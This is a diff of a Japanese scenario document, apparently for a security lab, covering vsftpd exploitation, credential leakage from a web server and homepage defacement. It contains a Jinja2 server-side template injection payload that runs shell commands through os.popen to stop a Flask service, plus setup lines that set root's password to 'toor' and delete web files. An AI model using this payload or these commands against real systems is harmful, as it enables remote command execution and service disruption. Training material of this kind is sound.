@@ -34,7 +34,6 @@ echo "root:toor" | chpasswd
 systemctl stop ftpd.service
 sudo rm -rf /var/www/html/README.md
 # yourname = request.args.get('name') or ""
-
 ```
 
 # シナリオ
@@ -96,8 +95,12 @@ vsftpdの脆弱性を利用した攻撃を行う
 
 WEBサーバーよりクレデンシャル情報が流出する
 
-- `:1x081/README.md`にリクエストが来る
+- `:8080/README.md`にリクエストが来る
 - クレデンシャル情報が流出する
+
+侵入された場合
+
+- ホームページが改竄される
 
 ## WEBアプリへの攻撃
 
@@ -113,7 +116,7 @@ SSTIでWEBアプリへの攻撃を行う
 ```
 
 ```
-/app?name={{request.application.__globals__.__builtins__.__import__("os").popen("pkill -f 'python3 /var/www/html/webapp/app.py'").read()}}
+/app?name={{request.application.__globals__.__builtins__.__import__("os").popen("sudo systemctl stop http-flask.service").read()}}
 ```
 
 
